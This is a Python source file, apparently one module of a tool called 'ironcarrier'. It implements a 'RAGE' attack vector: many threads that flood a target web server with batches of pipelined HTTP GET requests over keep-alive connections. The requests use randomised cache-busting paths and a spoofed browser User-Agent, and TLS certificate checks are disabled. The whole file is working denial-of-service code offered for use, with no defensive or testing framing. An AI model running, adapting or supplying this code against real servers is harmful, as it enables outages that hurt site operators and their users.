#!/usr/bin/env python3
"""
RAGE Vector
Multiple GET requests in single keep-alive connection
"""

import socket
import ssl
import random
import time
import threading
import string
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """RAGE attack vector - pipelined requests"""
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 100, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.use_ssl = kwargs.get('ssl', port == 443)
        self.requests_per_conn = kwargs.get('requests_per_conn', 50)
        self.path = kwargs.get('path', '/')
        self.timeout = kwargs.get('timeout', 10)
    
    def _random_path(self) -> str:
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        cache = f"_={random.randint(10**12, 10**13-1)}"
        base = self.path.rstrip('/')
        return f"{base}/{rand}?{cache}"
    
    def _build_pipelined_request(self) -> bytes:
        """Build multiple requests in one send"""
        requests = []
        for _ in range(self.requests_per_conn):
            req = (
                f"GET {self._random_path()} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            requests.append(req)
        
        return ''.join(requests).encode()
    
    def _create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))
        
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.target)
        
        return sock
    
    def _attack_thread(self) -> None:
        end_time = time.time() + self.duration
        
        while time.time() < end_time and not self.stop_event.is_set():
            sock = None
            try:
                sock = self._create_socket()
                payload = self._build_pipelined_request()
                sock.sendall(payload)
                self.stats.add_packets(self.requests_per_conn, len(payload))
                self.stats.add_connection()
                
                # Drain some response to keep buffer clear
                try:
                    sock.recv(8192)
                except Exception:
                    pass
                    
            except Exception:
                self.stats.add_error()
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass
    
    def run(self) -> None:
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 5)
